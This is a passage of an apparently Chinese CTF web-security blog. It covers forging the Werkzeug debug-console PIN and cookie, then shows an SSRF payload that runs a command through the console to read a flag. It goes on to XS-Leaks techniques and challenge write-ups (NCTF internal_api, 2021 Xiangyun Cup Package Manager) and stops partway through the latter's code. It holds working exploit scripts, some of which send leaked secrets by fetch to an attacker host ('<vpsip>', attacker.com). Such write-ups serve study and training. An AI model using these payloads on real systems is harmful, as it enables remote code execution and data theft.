<h2 id="高版本（werkzeug-2-0-x-SHA1）"><a href="#高版本（werkzeug-2-0-x-SHA1）" class="headerlink" title="高版本（werkzeug&gt;&#x3D;2.0.x SHA1）"></a>高版本（werkzeug&gt;&#x3D;2.0.x SHA1）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"> </span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment">#/etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment">#默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment">#默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span><span class="comment">#moddir，报错得到</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377568585&#x27;</span>,/sys/<span class="keyword">class</span>/net/eth0/address 十进制</span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce898ba65fb61b89725c91a48c418b81bf98bd269b6f97002c3d8f69da8594d2d2&#x27;</span></span><br><span class="line">    <span class="comment">#看上面machine-id部分</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"> </span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"> </span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"><span class="comment">#cookie</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cookie_name + <span class="string">&quot;=&quot;</span> + <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(rv)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#NewStar2023 web-week5 pppython？ payload</span></span><br><span class="line">/?url=http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1314</span>/console?&amp;__debugger__=yes&amp;pin=<span class="number">145</span>-<span class="number">814</span>-<span class="number">152</span>&amp;cmd=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()&amp;frm=<span class="number">0</span>&amp;s=5qCKACnC2zpDYrw9vNF5&amp;lolita[]=Cookie:__wzd0bfb608fc2863a1b76bf=<span class="number">1739904227</span>|99e9a9982756</span><br><span class="line"><span class="comment">#主参数就是url和lolita，第二个问号后的是传给console的，需要进行一次url编码，然后整体还要进行一次url编码，免得特殊符号不能被识别（最重要的是空格要二次编码，不然命令不能执行）</span></span><br><span class="line"><span class="comment">#frm是错误代码行数，如果没有报错显示便为0</span></span><br><span class="line"><span class="comment">#s是安全令牌，可在console页面源代码中查看，缺少一般不能执行命令</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>XSleak</title>
    <url>/2025/06/22/XS-Leaks/</url>
    <content><![CDATA[<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>网页前端侧信道攻击，常见侧信道如下:</p>
<ul>
<li>浏览器的 api (e.g. <a href="https://xsleaks.dev/docs/attacks/frame-counting/">Frame Counting</a> and <a href="https://xsleaks.dev/docs/attacks/timing-attacks/">Timing Attacks</a>)</li>
<li>浏览器的实现细节和 bugs (e.g. <a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">Connection Pooling</a> and <a href="https://xsleaks.dev/docs/attacks/historical/content-type/#typemustmatch">typeMustMatch</a>)</li>
<li>硬件 bugs (e.g. Speculative Execution Attacks <a href="https://xsleaks.dev/#fn:4">4</a>)</li>
</ul>
<h1 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h1><ul>
<li>模糊查找</li>
<li>受害者可执行js代码</li>
<li>二元结果</li>
</ul>
<h1 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h1><p>确定要泄露的信息→信息可以通过模糊查找→正确&#x2F;错误可以被判断→可以写出泄露&amp;外带脚本→有bot&#x2F;第三方<strong>访问</strong>目标页面(受害者可执行js代码)→触发代码执行，得到结果</p>
<h1 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h1><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>访问某网站，成功返回200，失败返回500</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">probeError</span>(<span class="params">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> url = <span class="string">&#x27;http://127.0.0.1:8000/internal/search?s=&#x27;</span> + flag;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">src</span> = url;</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//当验证成功时，将 flag 通过 fetch 发送到接收服务器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://&lt;vpsip&gt;/?flag=&#x27;</span> + flag, &#123; <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span> &#125;);</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">leak</span>(flag);</span></span><br><span class="line"><span class="language-javascript">        script.<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> script.<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//构造&lt;script src=url onload=fetch…… onerror=script.remove()&gt;,访问成功(200)执行onload，失败(500)移除script</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> dicts = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dicts.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> char = dicts[i];</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">probeError</span>(flag + char);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">leak</span>(<span class="string">&#x27;nctf&#123;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="XS-Search"><a href="#XS-Search" class="headerlink" title="XS-Search"></a>XS-Search</h2><ul>
<li>frames 的數量</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://www.facebook.com/search/str/chen/users-named/me/friends/intersect&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//会显示名字中有chen的结果,如果有frame为1,没有则为0</span></span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (win.<span class="property">frames</span>.<span class="property">length</span> === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com/?result=no&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com/?result=yes&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    win.<span class="title function_">close</span>()</span></span><br><span class="line"><span class="language-javascript">  &#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>cache probing</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 程式碼改寫自 https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels#cache-and-error-events</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> url = <span class="string">&#x27;https://app.huli.tw/found.png&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 這行可以在 URL 後面加上一堆逗號，送出去的 request 的 referrer 就會太大</span></span></span><br><span class="line"><span class="language-javascript">history.<span class="title function_">replaceState</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="title class_">Array</span>(<span class="number">16e3</span>));</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span></span><br><span class="line"><span class="language-javascript">img.<span class="property">src</span> = url;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r, e</span>)=&gt;</span>&#123;img.<span class="property">onerror</span>=e;img.<span class="property">onload</span>=r;&#125;);</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&#x27;Resource was cached&#x27;</span>); <span class="comment">// Otherwise it would have errored out</span></span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&#x27;Resource was not cached&#x27;</span>); <span class="comment">// Otherwise it would have loaded</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//如果图片没有在缓存中,服务器就会发request去拿,但是会由于referer太长而报错,触发e,是缓存清除;如果在缓存中就不会发request,会触发r</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>img</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://1.png&quot;</span> <span class="attr">onerror</span>=<span class="string">e</span> <span class="attr">onload</span>=<span class="string">r</span>&gt;</span></span><br><span class="line">//如果图片没有加载则e,加载了则r</span><br><span class="line">//可以用来探测用户是否登录了某网站</span><br></pre></td></tr></table></figure>

<h1 id="例题"><a href="#例题" class="headerlink" title="例题:"></a>例题:</h1><h2 id="NCTF-internal-api"><a href="#NCTF-internal-api" class="headerlink" title="[NCTF]internal_api"></a>[NCTF]internal_api</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">report</span>(<span class="title function_ invoke__">Form</span>(report): Form&lt;Report&gt;) <span class="punctuation">-&gt;</span> Json&lt;Value&gt; &#123;</span><br><span class="line">    task::<span class="title function_ invoke__">spawn</span>(<span class="keyword">async</span> <span class="keyword">move</span> &#123; bot::<span class="title function_ invoke__">visit_url</span>(report.url).<span class="keyword">await</span>.<span class="title function_ invoke__">unwrap</span>() &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Json</span>(json!(&#123;</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: <span class="string">&quot;bot will visit the url soon&quot;</span></span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用rot访问 url</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">public_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = pool.<span class="title function_ invoke__">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">false</span>)?;</span><br><span class="line"><span class="comment">//用户搜索非隐藏comment</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">private_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">    <span class="title function_ invoke__">ConnectInfo</span>(addr): ConnectInfo&lt;SocketAddr&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="comment">// 以下两个 if 与题目无关, 你只需要知道: private_search 路由仅有 bot 才能访问</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bot_ip</span> = tokio::net::<span class="title function_ invoke__">lookup_host</span>(<span class="string">&quot;bot:4444&quot;</span>).<span class="keyword">await</span>?.<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> addr.<span class="title function_ invoke__">ip</span>() != bot_ip.<span class="title function_ invoke__">ip</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;only bot can access&quot;</span>).<span class="title function_ invoke__">into</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">true</span>)?;</span><br><span class="line"><span class="comment">//rot可以搜索隐藏comment</span></span><br><span class="line"><span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果搜寻到返回200，如果没有就返回500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//db.rust</span></span><br><span class="line"><span class="keyword">for</span> <span class="variable">comment</span> <span class="keyword">in</span> comments &#123;</span><br><span class="line">        conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">            <span class="string">&quot;INSERT INTO comments(content, hidden) VALUES(?, ?)&quot;</span>,</span><br><span class="line">            params![comment, <span class="literal">false</span>], <span class="comment">// 普通评论标记为非隐藏</span></span><br><span class="line">        )?;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">        <span class="string">&quot;INSERT INTO comments(content, hidden) VALUES(?, ?)&quot;</span>,</span><br><span class="line">        params![flag, <span class="literal">true</span>], <span class="comment">// 插入flag标记为隐藏</span></span><br><span class="line">    )?;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">search</span>(conn: DbConn, query: <span class="type">String</span>, hidden: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stmt</span> =</span><br><span class="line">        conn.<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM comments WHERE content LIKE ? AND hidden = ?&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = stmt</span><br><span class="line">        .<span class="title function_ invoke__">query_map</span>(params![<span class="built_in">format!</span>(<span class="string">&quot;%&#123;&#125;%&quot;</span>, query), hidden], |row| &#123; <span class="comment">// 用户输入被包裹在通配符中</span></span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(row.<span class="title function_ invoke__">get</span>(<span class="number">0</span>)?)</span><br><span class="line">        &#125;)?</span><br><span class="line">        .collect::&lt;rusqlite::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;&gt;()?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(comments)</span><br><span class="line"> <span class="comment">//搜索为模糊匹配</span></span><br></pre></td></tr></table></figure>

<p>只有rot才能访问flag，但是我们不能直接获取到flag，只能通过200&#x2F;500的状态码判断结果，类似布尔盲注</p>
<p>Xsleak是让服务器端执行script代码来进行的，所以我们让rot访问vps上的恶意html文件，如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">probeError</span>(<span class="params">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> url = <span class="string">&#x27;http://127.0.0.1:8000/internal/search?s=&#x27;</span> + flag;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">src</span> = url;</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//当验证成功时，将 flag 通过 fetch 发送到接收服务器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://&lt;vpsip&gt;/?flag=&#x27;</span> + flag, &#123; <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span> &#125;);</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">leak</span>(flag);</span></span><br><span class="line"><span class="language-javascript">        script.<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> script.<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//构造&lt;script src=url onload=fetch…… onerror=script.remove()&gt;,访问成功(200)执行onload，失败(500)移除script</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> dicts = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dicts.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> char = dicts[i];</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">probeError</span>(flag + char);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">leak</span>(<span class="string">&#x27;nctf&#123;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后就可以在vps上收到结果：</p>
<p><img src="/../images/91f34034-ac14-410c-9327-3506f1c79b5e.png"></p>
<h2 id="2021祥云杯-Package-Manager-2021"><a href="#2021祥云杯-Package-Manager-2021" class="headerlink" title="[2021祥云杯]Package Manager 2021"></a>[2021祥云杯]Package Manager 2021</h2><p>首先发现flag在数据库中,确定我们要泄露pack.description</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> flag = &#123;</span><br><span class="line">            <span class="string">&quot;user_id&quot;</span>: admin.<span class="property">id</span>,</span><br><span class="line">            <span class="string">&quot;pack_id&quot;</span>: <span class="title function_">genPackageId</span>(admin.<span class="property">id</span>),</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Flag is here&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: process.<span class="property">env</span>.<span class="property">FLAG</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.1&quot;</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>对pack.description的引用进行查找,发现在渲染文件中此处可以插入html内容,同时在search中可以通过description进行查找,并成功200失败404</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">//pack.pug</span></span><br><span class="line">          p.<span class="property">card</span>-text</span><br><span class="line">            | !&#123;package.<span class="property">description</span>&#125;</span><br><span class="line">            <span class="comment">//这里是应用的!不会转义html内容</span></span><br><span class="line"><span class="comment">//packages.ts</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/list&#x27;</span>, <span class="title function_">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> packs = <span class="keyword">await</span> <span class="title class_">Package</span>.<span class="title function_">find</span>(&#123; <span class="attr">user_id</span>: req.<span class="property">session</span>.<span class="property">userId</span> &#125;);</span><br><span class="line">    <span class="keyword">if</span> (packs.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/packages&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; search &#125; = req.<span class="property">query</span>;<span class="comment">//接受search参数</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (search) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过name和description搜索，如果文件包含则返回</span></span><br><span class="line">            <span class="keyword">let</span> description = search;</span><br><span class="line">            <span class="keyword">let</span> name = search;</span><br><span class="line">            <span class="comment">//如果传入的search就是结构化对象，那么name和description就是结构化对象了</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> description === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">                description = &#123; description &#125;;</span><br><span class="line">            &#125;<span class="comment">//将一个变量重新赋值为一个对象，且该对象的属性名与变量名相同，属性值为变量当前的值</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> name === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">                name = &#123; name &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">const</span> packs = <span class="keyword">await</span> <span class="title class_">Package</span>.<span class="title function_">find</span>(&#123;</span><br><span class="line">                <span class="attr">user_id</span>: req.<span class="property">session</span>.<span class="property">userId</span>,</span><br><span class="line">                <span class="attr">$or</span>: [name, description],</span><br><span class="line">            &#125;);<span class="comment">//$or 数组中的每个条件必须是一个查询对象（键值对形式）</span></span><br><span class="line">            <span class="keyword">if</span> (packs.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">            &#125;<span class="comment">//失败就404</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;packages&#x27;</span>, &#123; packs &#125;);<span class="comment">//成功就返回结果</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">500</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;packages&#x27;</span>, &#123; packs &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>同时有个bot.ts它是使用admin身份登录,访问submit传递的id页面</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">        page.<span class="title function_">on</span>(<span class="string">&#x27;dialog&#x27;</span>, <span class="keyword">async</span> dialog =&gt; &#123;</span><br><span class="line">            <span class="keyword">await</span> dialog.<span class="title function_">accept</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Working&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;/login&#x27;</span>, base).<span class="title function_">toString</span>());</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;#username&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;#password&#x27;</span>, process.<span class="property">env</span>.<span class="property">ADMIN_PASSWORD</span>);</span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>([page.<span class="title function_">waitForNavigation</span>(), 